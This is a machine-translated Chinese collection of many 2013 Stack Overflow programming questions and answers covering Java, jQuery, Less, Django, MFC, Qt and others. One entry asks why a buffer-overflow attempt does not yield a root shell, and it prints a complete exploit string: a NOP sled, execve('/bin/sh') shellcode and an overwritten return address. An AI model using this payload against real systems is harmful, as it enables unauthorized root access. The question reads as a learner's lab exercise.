并将其放在与您的相同目录中`Metadata.java`，然后`JAXBContext.newInstance("org.musicbrainz.mmd2")`将自动使用 EclipseLink JAXB 实现。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-12-19T16:54:55.517

对于您使用`xjc`或不想直接使用注释来生成 java 类的情况，您可以通过 MOXy 绑定文件 (oxm) 来实现：

```
<?xml version="1.0"?>
<xml-bindings
  xmlns="http://www.eclipse.org/eclipselink/xsds/persistence/oxm"
  package-name="your.package.name">

  <xml-schema
    namespace="http://yournamespace">
    <xml-ns
      prefix=""
      namespace-uri="http://yournamespace">
    </xml-ns>
  </xml-schema>
</xml-bindings> 
```

这相当于 Blaise 在`package-info`.

有关如何使用外部绑定文件的信息，请参阅[此答案。](https://stackoverflow.com/a/9432435/2791390)

# java - 将类作为参数传递给方法

> ID：15111911
> 
> 赞同：3
> 
> 时间：2013-02-27T12:15:13.117
> 
> 标签：java

我正在执行以下操作来建立 TestA 类的公共方法。

```
List<String> strings = new ArrayList<String>();
Method[] methods = TestA.class.getDeclaredMethods();
for(Method method : methods) 
{
  if(Modifier.isPublic(method.getModifiers())) 
  {         
    strings.add(method.getName());
  }
} 
```

我还需要对等做同样的事情`TestB`，`TestC`所以我想要一个函数，它接受一个类名并返回一个公共方法的字符串数组。我怎样才能做到这一点？

如果我有一个 Object 参数，我必须先创建每个 Class 的实例，然后再将它们发送到函数。我希望避免这种情况。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-27T12:17:01.447

听起来你想要：

```
public static List<String> getPublicDeclaredMethods(Class<?> clazz) {
    List<String> strings = new ArrayList<String>();
    Method[] methods = clazz.getDeclaredMethods();
    for(Method method : methods)  {
        if(Modifier.isPublic(method.getModifiers())) {
            strings.add(method.getName());
        }
    }
    return strings;
} 
```

然后调用它：

```
List<String> names = getPublicDeclaredMethods(TestA.class); 
```

您还应该考虑使用[`Class.getMethods`](http://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#getMethods%28%29)which 无论如何只返回公共方法 - 但返回从超类继承的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T12:17:38.013

您可以将`java.lang.Class`实例传递给 self ，如下所示

```
 public void introspectClass(Class cls){
    List<String> strings = new ArrayList<String>();
    Method[] methods = cls.getDeclaredMethods();
    for(Method method : methods) 
    {
      if(Modifier.isPublic(method.getModifiers())) 
      {         
        strings.add(method.getName());
      }
    }
    } 
```

# javascript - 在不刷新页面的情况下更新 p 文本

> ID：15111918
> 
> 赞同：0
> 
> 时间：2013-02-27T12:15:38.797
> 
> 标签：javascript, jquery, html

我有一个带有段落的 div：

```
 <div id="id1"><span></span><p id="id-text">Starting text</p></div> 
```

现在，当与服务器（通过 ajax）建立联系时，将调用以下函数：

```
<script type="text/javascript">
var fun = function (serverIsOk) {
        $('#id-text').innerHTML = serverIsOk ? 'Server ok text' : 'Starting text';
        $('#id1').show();           
}; 
</script> 
```

正在调用该函数，但由于某种原因，文本并未更新。想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:16:24.490

jQuery 对象中没有`innerHTML`属性，请改用[`html()`](http://api.jquery.com/html/)方法：

```
$("#id-text").html(serverIsOk ? "Server ok text" : "Starting text"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T12:16:50.720

`.innerHTML`不是由 jQuery 或*jQuery 对象*抽象的属性。您要么必须使用该`.html()`函数，要么访问底层*DOM 节点*，例如

```
$('#id-text')[ 0 ].innerHTML = serverIsOk ? 'Server ok text' : 'Starting text'; 
```

或者，使用 jQuerys`.html()`方法，如

```
$('#id-text').html(serverIsOk ? 'Server ok text' : 'Starting text'); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-27T12:16:59.887

采用

```
$('#id-text')[0].innerHTML = 
```

或者

```
$('#id-text').html() 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-27T12:17:50.090

使用`.text()`或`.html()`，

```
var response = serverIsOk ? 'Server ok text' : 'Starting text';
$('#id-text').text(response); 
```

**或者**

```
var response = serverIsOk ? 'Server ok text' : 'Starting text';
$('#id-text').html(response); 
```

# magento - Magento 子类别问题

> ID：15111922
> 
> 赞同：-1
> 
> 时间：2013-02-27T12:15:45.073
> 
> 标签：magento, categories

您好，我需要获取子类别的父类别 ID。如果我在子类别页面中，我需要其父类别的 ID，以便我可以对我的代码进行一些修改，以我的方式显示子类别。请帮我这样做。提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T18:53:33.443

$parent_id = $this->getCurrentCategory()->getParentCategory()->getId();

回声 $parent_id;

这会做。

# css - LessCSS：在连接的类中嵌套函数

> ID：15111924
> 
> 赞同：0
> 
> 时间：2013-02-27T12:15:55.520
> 
> 标签：css, nested, less, rules, mixins

我在让 LessCSS 使用“&”连接选择器处理具有一系列嵌套规则的文件时遇到了真正的问题。

例如，以下将正常工作：

```
.grey-table {
    background: #EDEDED;
    tr {
        th {
            background: #DEDEDE;
        }
        td {
            color: #888;
        }
        &:nth-child(odd) {
            td {
                background-color: #F9FCFF;
            }
        }
        &:nth-child(even) {
            td {
                background-color: #EDF5FF;
            }
        }
        &:hover {
            td {
                background-color: #DFEAF9;
            }
        };
    }
} 
```

但是，如果我将颜色更改为函数（任何类型 - 预定义或混合），我会收到错误消息

“*第 12 行的语法错误 - 未定义*”

```
 .grey-table {
    background: desaturate(#EDEDED, 100%);
    tr {
        th {
            background: desaturate(#DEDEDE, 100%);
        }
        td {
            color: desaturate(#888, 100%);
        }
        &:nth-child(odd) {
            td {
                background-color: desaturate(#F9FCFF, 100%); <------ Line 12
            }
        }
        &:nth-child(even) {
            td {
                background-color: desaturate(#EDF5FF, 100%);
            }
        }
        &:hover {
            td {
                background-color: desaturate(#DFEAF9, 100%);
            }
        };
    }
} 
```

我找不到任何关于此的参考资料，但我确定我不能是唯一的？

非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:36:07.927

我通常先定义颜色，然后在函数中调用它们：

```
@mycolor: #F9FCFF;
desaturate(@mycolor, 100%); 
```

很抱歉，您的代码在 less 页面上没有错误：http: [//less2css.org/](http://less2css.org/)

尝试将其粘贴（没有您的 <--- 第 12 行），您会看到它有效。也许您正在使用一些与页面上的 less 脚本交互的 javastript。

**编辑：** 最后还有一个分号，它打破了 less 解析器的旧版本（<=1.3.1）。如果我把它拿出来，它可以很好地通过所有版本解析......而且我无法重现你的错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T11:19:24.107

我是个白痴，没有注意到冒号后第 12 行的标签。

这就是导致错误的原因，但只有当 css mixin/variable 较少时。向所有人道歉。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T15:21:50.903

我同意 Martin 的观点，我无法使用上面的代码和[http://less2css.org/](http://less2css.org/)上的编译器重现您的错误。我可以在第 12 行重现语法错误消息的唯一方法是：

1.  去掉属性后面的冒号`background-color`。
2.  在分号末尾添加一些与注释无关的字符（就像您的注释`<--- line 12`无效，但我确定您将其放入上面的说明中）。
3.  在 (a) 颜色、(b) 百分比或 (c) 括号后添加结束引号。(b) - 的一个例子`100%'`。可能还有其他一些字符也会导致它，但有些字符只是直接打印到 css 中而不会出现语法错误。
4.  属性名称之前由空格或其他无效字符分隔的字符，例如`y background-color`或`*background-color`。

显然，上面显示的代码中都不存在这些，但您可能会仔细检查您的实际代码是否没有可能导致问题的一些额外字符或缺失字符。

# python - django模型继承和管理应用

> ID：15111931
> 
> 赞同：0
> 
> 时间：2013-02-27T12:16:24.570
> 
> 标签：python, django, django-grappelli, django-tinymce, django-filebrowser

我有一个 django 应用程序，我想在其中使用模型继承。该应用程序包含一个超级模型类`Article`，这是它的代码

```
class Article(models.Model):
    english_title = CharField(max_length=200)
    arabic_title = CharField(max_length=200)
    english_body = HTMLField()
    arabic_body = HTMLField()
    enabled = BooleanField()

    def __unicode__(self):
        return self.english_title

    def get_body(self, locale):
        if locale == "ar" :
            return self.arabic_body
        else:
            return self.english_body

    def get_title(self, locale):
        if locale == "ar" :
            return self.arabic_title
        else:
            return self.english_title 
```

并且有一个名为的子类`History`扩展了这个类，这是它的代码

```
class History(Article, IHasAttachments):
     date = DateField(auto_now_add=True) 
```

我的问题出现在管理应用程序中，其中历史模型中的 dateField（日期）在插入新条目时没有出现在管理表单中。

注意：我正在使用 django-tinymce、djnago-filebrowser 和 django-grappelli

会有什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:44:11.860

我认为问题出在您设置 auto_now_add=True 的历史模型中，这将阻止您的日期字段显示在管理员上，请查看有关[模型字段参考](https://docs.djangoproject.com/en/1.5/ref/models/fields/#django.db.models.DateField.auto_now_add)的 django 文档：

> 按照目前的实现，将 auto_now 或 auto_now_add 设置为 True 将导致该字段设置为 editable=False 和 blank=True。

关于[Field.editable](https://docs.djangoproject.com/en/1.5/ref/models/fields/#editable)：

> 如果为 False，该字段将不会显示在 admin 或任何其他 ModelForm 中。

如果您希望它可编辑但也有默认值，请尝试以下操作：

```
class History(Article, IHasAttachments):
    date = DateField(default=datetime.date.today) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:19:34.657

也许它的继承问题，尝试混合：

[http://www.linuxjournal.com/node/4540/print](http://www.linuxjournal.com/node/4540/print)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:57:18.900

如果您添加`auto_now=True`此字段将在每次修改时更新。因此，您无法对其进行编辑从逻辑上讲是正常的。

如果您想在创建实例时添加自动日期，我建议您这样做：

```
from django.utils.timezone import now

class History(Article, IHasAttachments):
     date = DateField(default=now()) 
```

# c++ - 在我的 MVS 项目中包含一个标头时出错

> ID：15111933
> 
> 赞同：0
> 
> 时间：2013-02-27T12:16:30.670
> 
> 标签：c++, visual-studio-2010, qt

我正在尝试将 ah 文件包含到我的项目中，但我发现了一些错误。该程序运行正常。我真的需要我包含的 H 文件，我什至尝试更改一些东西，但我的项目中仍然存在同样的问题。

问题的根源以粗体字列出。

代码在上面。

```
class AFX_MODULE_THREAD_STATE : public CNoTrackObject { public:
AFX_MODULE_THREAD_STATE();
virtual ~AFX_MODULE_THREAD_STATE();

// current CWinThread pointer
CWinThread* m_pCurrentWinThread;

// list of CFrameWnd objects for thread
CTypedSimpleList<CFrameWnd*> m_frameList;

// temporary/permanent map state
DWORD m_nTempMapLock;           // if not 0, temp maps locked
CHandleMap* m_pmapHWND;
CHandleMap* m_pmapHMENU;
CHandleMap* m_pmapHDC;
CHandleMap* m_pmapHGDIOBJ;
CHandleMap* m_pmapHIMAGELIST;

// thread-local MFC new handler (separate from C-runtime)
_PNH m_pfnNewHandler;

#ifndef _AFX_NO_SOCKET_SUPPORT
// WinSock specific thread state
HWND m_hSocketWindow;
#ifdef _AFXDLL
CEmbeddedButActsLikePtr<CMapPtrToPtr> m_pmapSocketHandle;
CEmbeddedButActsLikePtr<CMapPtrToPtr> m_pmapDeadSockets;
CEmbeddedButActsLikePtr<CPtrList> m_plistSocketNotifications;
#else
CMapPtrToPtr* m_pmapSocketHandle;
CMapPtrToPtr* m_pmapDeadSockets;
CPtrList* m_plistSocketNotifications;
#endif
#endif

// common controls thread state
CToolTipCtrl* m_pToolTip;
CWnd* m_pLastHit;       // last window to own tooltip
INT_PTR m_nLastHit;         // last hittest code 
```

> **TOOLINFO* m_pLastInfo; // 最后一个 TOOLINFO 结构**

```
INT_PTR m_nLastStatus;      // last flyby status message
CControlBar* m_pLastStatus; // last flyby status control bar
};

#if (_WIN32_WINNT >= 0x600)
#ifndef _WINSOCK2API_
#ifdef _WINSOCKAPI_ 
```

> **#error MFC 需要使用 Winsock2.h**

```
#endif
#include <winsock2.h>
#endif 
```

...

至于错误如下：

```
- 1>C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\atlmfc\include\afxstat_.h(172): error C2143: syntax error : missing ';' before '*'

- 1>C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\atlmfc\include\afxstat_.h(172): error C4430: missing type specifier - int assumed. Note: C++ does not support default-int

- 1>C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\atlmfc\include\afxstat_.h(172): error C4430: missing type specifier - int assumed. Note: C++ does not support default-int

- 1>C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\atlmfc\include\afxwin.h(112):  fatal error C1189: #error :  MFC requires use of Winsock2.h 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:30:17.160

您发布的代码既没有包含警卫，也`#pragma once`没有包含标题或前向声明，所以我认为它不完整。因此，这在这里有点猜测，但也许会有所帮助：

*   第一个问题似乎是编译器不知道是什么`TOOLINFO`- 可能缺少一些包含，或者您以某种方式弄乱了命名空间，`#defines`或者在包含该标头之前的其他事情。
*   第二个问题是您直接或间接地包含`Winsock.h`了之前的冲突`Winsock2.h`，必须将其用于 MFC。

结论：可以肯定地说您在某处弄乱了代码，但错误在包含的标题中显示得更晚，并且似乎与混乱的原始原因无关。

# c - 从子进程分叉后缓冲区溢出分离

> ID：15111936
> 
> 赞同：0
> 
> 时间：2013-02-27T12:16:40.337
> 
> 标签：c, buffer-overflow

我正在尝试一个基本的缓冲区溢出攻击，它会产生一个 root shell。我面临“从子进程分叉后调度*** *”的问题

我如何摆脱这个并产生根外壳？

我试图以普通用户的身份在我的 gdb 中生成 root shell（显然）。我已经以各种可能的方式编译了易受攻击的程序：我禁用了 ALSR...禁用 DEP...使用了 -fno-stack-保护者编译它

当我在我的 gdb 中运行它时，我得到了这个 -->

还有一件事：缓冲区大小为 100，并且在 120 处发生分段错误！

所以 60bytes of \x90 + size 50 of shellcode + size 10 of "A"(padding) + Overwritten address(8) = (60+50+10=120; 120+overwritten address=128)

```
[bhabi@localhost buffer]$ gdb -q bof

(gdb) r `perl -e 'print "\x90" x 60, "\x48\x31\xc0\x48\x83\xc0\x71\x48\x31\xff\x48\x31\xf6\x0f\x05\xeb\x13\x48\x31\xc0\x48\x83\xc0\x3b\x5f\x88\x67\x07\x48\x31\xf6\x48\x31\xd2\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x90", "A" x 10, "\x60\xe4\xff\xff\xff\x7f\x00\x00"'` 
```

启动程序：

```
/home/bhabi/buffer/bof `perl -e 'print "\x90" x 60, "\x48\x31\xc0\x48\x83\xc0\x71\x48\x31\xff\x48\x31\xf6\x0f\x05\xeb\x13\x48\x31\xc0\x48\x83\xc0\x3b\x5f\x88\x67\x07\x48\x31\xf6\x48\x31\xd2\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x90", "A" x 10, "\x60\xe4\xff\xff\xff\x7f\x00\x00"'

process 7*** is executing new program: /bin/bash      
Missing separate debuginfos, use: debuginfo-install glibc-2.14.90-24.fc16.9.x86_64      
Detaching after fork from child process 7***.  
Detaching after fork from child process 7***.      
Detaching after fork from child process 7**.      
[bhabi@localhost buffer]$ 
```

我期待 [root@localhost 缓冲区]$`

* * *

我什至试过

```
set follow-fork-mode child
set detach-on-fork off 
```

# perl - Net::Telnet，发送是或否

> ID：15111951
> 
> 赞同：1
> 
> 时间：2013-02-27T12:17:17.893
> 
> 标签：perl

我正在编写一个使用 Net::Telnet 的程序，但是当我使用 时`$tel->cmd`，设备等待是或否以继续 cmd，我如何使用 Net::Telnet 来做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:47:01.220

如果您不希望出现提示，请使用`print()`and`waitfor()`而不是`cmd()`.

例如对话：

```
testmachine# launch-fireworks
Are you sure? (yes/no/MAYBE) yes
Fireworks launched
testmachine# 
```

可以像这样自动化：

```
$telnet->print('launch-fireworks');
$telnet->waitfor('Are you sure? (yes/no/MAYBE)');
$telnet->cmd('yes'); 
```

在`yes`我们期望提示出现之后，我们可以`cmd()`再次使用。

# android - 可滚动布局与视图重叠

> ID：15111954
> 
> 赞同：0
> 
> 时间：2013-02-27T12:17:30.750
> 
> 标签：android, layout, android-softkeyboard

只能在软键盘与某些视图重叠时设置可滚动布局吗？我可以检测键盘是否可见，但我可以检测某些视图是否重叠，然后才将其设置为可滚动？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:42:15.073

无需处理 ScrollView。您可以 `android:windowSoftInputMode="adjustPan"`在 Manifest 的 Activity 标记中使用以自动调整，而无需使用滚动视图。

# jquery - Jquery Sortable 不会在更新时提醒“订单”

> ID：15111957
> 
> 赞同：3
> 
> 时间：2013-02-27T12:17:34.770
> 
> 标签：jquery, jquery-ui, jquery-ui-sortable

这应该是直截了当的，但是我在提醒我的可排序列表的顺序时遇到了真正的麻烦。

这是我正在使用的 JQuery 代码：

```
$(document).ready(function() {
    $("#projectItems").sortable({
        update : function(event, ui) {
            var order = $(this).sortable('toArray').toString();
            alert(order);

        }
    });
}); 
```

这是我的列表的 HTML：

```
<ul id="projectItems">
                    <li id="item1" value="<?php echo $studentChoice1; ?>">(1) <?php echo $title[1]; ?><a href='#message1' onclick='deleteProject(".$studentChoice1.",".$userID.")'><img height=20px width=20px alt='Delete' src='img/delete.png' /></a></li>
                    <li id="item2" value="<?php echo $studentChoice2; ?>">(2) <?php echo $title[2]; ?><a href='#message1' onclick='deleteProject(".$studentChoice2.",".$userID.")'><img height=20px width=20px alt='Delete' src='img/delete.png' /></a></li>
                    <li id="item3" value="<?php echo $studentChoice3; ?>">(3) <?php echo $title[3]; ?><a href='#message1' onclick='deleteProject(".$studentChoice3.",".$userID.")'><img height=20px width=20px alt='Delete' src='img/delete.png' /></a></li>
                    <li id="item4" value="<?php echo $studentChoice4; ?>">(4) <?php echo $title[4]; ?><a href='#message1' onclick='deleteProject(".$studentChoice4.",".$userID.")'><img height=20px width=20px alt='Delete' src='img/delete.png' /></a></li>
                    <li id="item5" value="<?php echo $studentChoice5; ?>">(5) <?php echo $title[5]; ?><a href='#message1' onclick='deleteProject(".$studentChoice5.",".$userID.")'><img height=20px width=20px alt='Delete' src='img/delete.png' /></a></li>
</ul> 
```

该列表是可排序的并且可以工作，但是当用户完成对项目的排序时，它根本不会显示警报消息。

非常感谢这里的任何帮助，因为我已经坚持了几天，似乎无法在线找到解决方案。

**更新** 问题似乎与引用jQuery有关

我正在使用的当前版本的 jQuery 是来自 google 的 CDN 的 1.7.1，在我的脚本中引用如下：

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script> 
```

但是，当我将其更改为：

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script> 
```

它根本不起作用！

另外，当我尝试像下面这样的引用时，它说有一个 jquery 引用错误！

```
<link href="http://code.jquery.com/ui/1.9.2/themes/base/jquery-ui.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" href="http://code.jquery.com/jquery-1.9.1.js"></script>
<script type="text/javascript" href="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script> 
```

我不知道如何解决这个问题，因为它似乎对其他人来说都很好！在这里的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:34:05.933

它工作正常，请在此处查看：http: [//jsfiddle.net/DHJb7/](http://jsfiddle.net/DHJb7/)

```
$(document).ready(function() {
$("#projectItems").sortable({
    update : function(event, ui) {
        var order = $(this).sortable('toArray').toString();
        alert(order);
    }
});
}); 
```

我认为您忘记包含 jQuery 或 jQueryUI 库。如果您已包含它们，请检查库的版本。

**推荐版本：** jQuery 1.9.1 和 jQueryUI 1.9.2

```
<link href="http://code.jquery.com/ui/1.9.2/themes/base/jquery-ui.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" href="http://code.jquery.com/jquery-1.9.1.js"></script>
<script type="text/javascript" href="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:36:55.830

看看这个[小提琴](http://jsfiddle.net/FUXys/1/)链接，它对我来说工作正常。

```
 $("#projectItems").sortable({
                update: function (event, ui) {
                    var order = $(this).sortable('toArray').toString();
                    alert(order);

                }
          }); 
```

我希望这会对你有更多帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:37:06.940

它应该工作。添加 jquery ui 和 jquery 库。只是要清楚，您需要更改项目的位置（通过拖放）以调用所需的功能（更新）。

# qt4 - QSortFilterProxyModel 和行号

> ID：15111965
> 
> 赞同：0
> 
> 时间：2013-02-27T12:17:51.733
> 
> 标签：qt4, pyqt4

由于排序和/或过滤，我正在使用一些带有 QSortFilterProxyModel 扩展的相关模型的表格视图。除了行号（我的意思是垂直标题）之外，一切都很好。使用此代码：

```
def headerData(self, section, orientation, role):
    if role == QtCore.Qt.DisplayRole:
        if orientation == QtCore.Qt.Horizontal:
            return self.__header[section]
        elif orientation == QtCore.Qt.Vertical:
            return section + 1 
```

固定的行号分配给每一行。这在排序/过滤时会导致问题。我想出了一个解决方案：覆盖默认的过滤和排序方法，并将一些额外的参数（行号）放入数据中，并在每次排序或过滤期间重写它。

问题：还有其他解决方案吗？一些在排序/过滤操作后向我显示真实项目位置的方法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T13:11:51.227

一个简单的`QSortFilterProxyModel`with custom子类`headerData`可以做到这一点：

```
class MyProxy(QtGui.QSortFilterProxyModel):
    def headerData(self, section, orientation, role):
        # if display role of vertical headers
        if orientation == QtCore.Qt.Vertical and role == QtCore.Qt.DisplayRole:
            # return the actual row number
            return section + 1
        # for other cases, rely on the base implementation
        return super(MyProxy, self).headerData(section, orientation, role) 
```

# c# - Ultrawingrid 滚动到底部

> ID：15111966
> 
> 赞同：0
> 
> 时间：2013-02-27T12:17:52.867
> 
> 标签：c#, infragistics

目前我的 test-ultrawinggrid 填充了大约 1000 行。当我一直滚动到底部（使用垂直滚动条）时，当最后一行到达网格的顶部而不是底部时，ultrawingrid 停止。换句话说 - 当我尽可能向下滚动时，最后一行出现在网格的最顶部，而网格的其余部分则为空白。

一旦最后一行进入网格底部（未到达顶部），如何设置网格停止向下滚动？

（我希望这是一个足够清楚的问题——因为它有点难以表达！）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T14:39:36.750

您正在寻找`ScrollBounds`网格的 DisplayLayout 上的属性。

默认情况下，这设置为`ScrollToLastItem`，您需要`ScrollToFill`。

# javascript - 没有将值传递给类实例

> ID：15111969
> 
> 赞同：0
> 
> 时间：2013-02-27T12:17:54.027
> 
> 标签：javascript, jquery, coffeescript

我有一个用 CoffeeScript 编写的非常简单的程序，如果用户单击一个按钮，则应该在控制台中显示一个值。下面是我的代码：

**HTML**

```
<!DOCTYPE html>
<html>
<head>

</head>
<body>
    <button id='butn'>click here</button>

    <script type="text/javascript" src="http://code.jquery.com/jquery-latest.min.js"></script>
    <script type="text/javascript" src="app.js"></script>
</body>
</html> 
```

app.js 是编译后的 CoffeeScript。我的 CoffeeScript 如下：

**初始化.coffee**

```
init = =>

  game = new Game()

# Start it all off
$(document).ready(init) 
```

* * *

**游戏.咖啡**

```
class Game

  constructor: () ->

    @UI = new UI() 
```

* * *

**ui.coffee**

```
class UI

  constructor: () ->

    @toolbar = new Toolbar('foo') 
```

* * *

**工具栏.coffee**

```
class Toolbar
  constructor: (@value) ->

    @clickhandler()

  clickhandler: () =>
    $('body').on 'click', '#butn', ->
        console.log 'Value = ', @value 
```

* * *

**编译后的 JS 是：**

```
// Generated by CoffeeScript 1.3.3
(function() {
  var Game, Toolbar, UI, init,
    _this = this,
    __bind = function(fn, me){ return function(){ return fn.apply(me, arguments); }; };

  init = function() {
    var game;
    return game = new Game();
  };

  $(document).ready(init);

  Game = (function() {

    function Game() {
      this.UI = new UI();
    }

    return Game;

  })();

  UI = (function() {

    function UI() {
      this.toolbar = new Toolbar('foo');
    }

    return UI;

  })();

  Toolbar = (function() {

    function Toolbar(value) {
      this.value = value;
      this.clickhandler = __bind(this.clickhandler, this);

      this.clickhandler();
    }

    Toolbar.prototype.clickhandler = function() {
      return $('body').on('click', '#butn', function() {
        return console.log('Value = ', this.value);
      });
    };

    return Toolbar;

  })();

}).call(this); 
```

* * *

# 问题

值 'foo' 未显示在控制台上。控制台记录“Value =”但没有“foo”。请有人可以帮助我理解为什么以及如何在不更改太多程序的情况下解决此问题。

感谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:27:33.997

您的问题是事件处理程序中[`this`关键字](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Operators/this)的值，它指向 DOM 元素而不是 Toolbar 实例。使用[函数绑定](http://coffeescript.org/#fat_arrow)：

```
class Toolbar
  constructor: (@value) ->
    @clickhandler()

  clickhandler: () ->
    $('body').on 'click', '#butn', =>
      console.log 'Value = ', @value 
```

# asp.net-mvc - Html.textboxFor 不显示模型属性值

> ID：15111971
> 
> 赞同：1
> 
> 时间：2013-02-27T12:18:01.187
> 
> 标签：asp.net-mvc, asp.net-mvc-2

我的 asp.net mvc 应用程序中有一个模型类。在控制器操作中，我将模型传递给这样的视图：

```
public ActionResult PlayAPI(string CallIDno)
{
    CallRecording callRecording = new CallRecording();
    using (ICallRecordingManager callRecordingManager = new ManagerFactory().GetCallRecordingManager()) {
        callRecording = callRecordingManager.GetAll().Where(c => c.CallIDNumber == CallIDno).FirstOrDefault();            
    }
    return View("PlayApi", callRecording);
} 
```

鉴于我正在使用这个：

```
<div class="flds-up">
    <div class="lft-txt">
        Call ID Number
    </div>
    <div class="new-fld">
        <%= Html.TextBoxFor(model => model.CallIDNumber, new { @class = "textarea required email"  })%>
    </div>
    <div class="clear-n">
    </div>
</div> 
```

但是文本框是空的，尽管 db 记录具有价值。我可以使用 Html.textbox 但我想使用模型绑定

# java - 老年代对象的统计？

> ID：15111977
> 
> 赞同：5
> 
> 时间：2013-02-27T12:18:22.457
> 
> 标签：java, garbage-collection, jvm, jvisualvm, jmap

是否有任何工具可以查看不同代 JVM 堆的对象统计信息？我正在调查潜在的内存泄漏，需要不同代的一些数据。我的用例是在老年代的对象上拍摄快照，等待，然后再拍摄另一个快照进行比较。

JVisualVM 提供了有关已创建对象的统计信息，但这对我没有多大帮助，因为我看不到特定对象的提升或使用速度是否比应有的更快。

Jmap 提供不同代的统计信息，但不是基于对象。在那个工具中我只能看到老一代正在增长......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T20:07:44.883

在 Yourkit 上运行您的应用程序。它有生成视图选项卡。您可以拍摄堆快照并比较快照之间哪些对象仍然存在。

[文档](http://www.yourkit.com/features/index.jsp#generations)

这是@JT 的一个有用的[答案](https://stackoverflow.com/questions/2335833/java-gc-top-object-classes-promoted-by-size)。

有关更多信息，请查看此[链接](http://www.cubrid.org/blog/dev-platform/how-to-monitor-java-garbage-collection/)

# forms - 设置标签的值，来自 ExTJS 中的数据库

> ID：15111980
> 
> 赞同：0
> 
> 时间：2013-02-27T12:18:28.713
> 
> 标签：forms, label, extjs3

我正在开发一个已经用 ExtJS 和 PHP 编写的项目。有一个 ExtJS 表单，当您单击“编辑”按钮时会出现它，它具有可编辑的文本字段，例如姓名、姓氏等。

它从数据库中获取字段的默认值，提交后，它也将它们返回到数据库，而列 id db 的名称在'name'前面，例如：

```
 firstnameFieldConfig : {
        fieldLabel: 'First Name',
        name: db_firstname', //it's a column in db
        allowBlank:false
   }, 
```

问题是，我有一些值必须显示在表单上，​​但它们不可编辑，或者它们不能发送到数据库，它们只是一些标签，比如总是固定的 stundet 编号。解决办法是什么？我怎样才能有一些固定的形式，它的价值确实来自 db。但最后不会被发送到任何地方？

PS：我可以使用标签（xtype：标签），但问题是标签值是固定的，应该在程序中硬编码。

PPS：应用程序在 ExtJS 3.0 中

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-27T23:06:32.903

您可以使用文本字段或数字字段并将其禁用属性设置为 true。

# blackberry - 使用黑莓从 php 到 java/get 参数进行通信

> ID：15111981
> 
> 赞同：-1
> 
> 时间：2013-02-27T12:18:30.577
> 
> 标签：blackberry, java-me

我想根据我从我 ping 的 php 得到的响应在我的黑莓应用程序中启动一些线程。为此，我想发送变量，就像我们将 URL 参数从 java 发送到 php 时使用的那样。这可以做到吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T13:00:41.297

您需要对您的 php 服务进行 http 调用，并在获得响应后对其进行相应处理，您应该使用 apache 的 http 客户端，这将帮助您：[How to call and pass the parameters to the Servlet using the Java class在我的摇摆应用程序中？](https://stackoverflow.com/questions/13586917/how-to-call-and-pass-the-parameters-to-the-servlet-using-the-java-class-in-my-sw/13587087#13587087)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T13:23:55.850

试试这个代码 -

```
String httpURL="http://www.your_url.com/login.php?username=123&password=123";
HttpConnection httpConn;
httpConn = (HttpConnection) Connector.open(httpURL);
httpConn.setRequestMethod(HttpConnection.POST);
DataOutputStream _outStream = new ataOutputStream(httpConn.openDataOutputStream());
byte[] request_body = httpURL.getBytes();
for (int i = 0; i < request_body.length; i++) {
    _outStream.writeByte(request_body[i]);
}
DataInputStream _inputStream = new DataInputStream(
httpConn.openInputStream());
StringBuffer _responseMessage = new StringBuffer();
int ch;
while ((ch = _inputStream.read()) != -1) {
    _responseMessage.append((char) ch);
}
String res = (_responseMessage.toString()); 
```

**编辑-**

考虑如果你得到像 json 这样的响应，那么下面的代码将帮助你解析它。 **`{"status":"100" "id":"123"}`**

```
JSONObject json = new JSONObject(res );
String status=json.getString("status");
String id=json.getString("id"); 
```

# c# - 如何在 .Net 4 中禁用显式垃圾收集？

> ID：15111989
> 
> 赞同：2
> 
> 时间：2013-02-27T12:19:03.213
> 
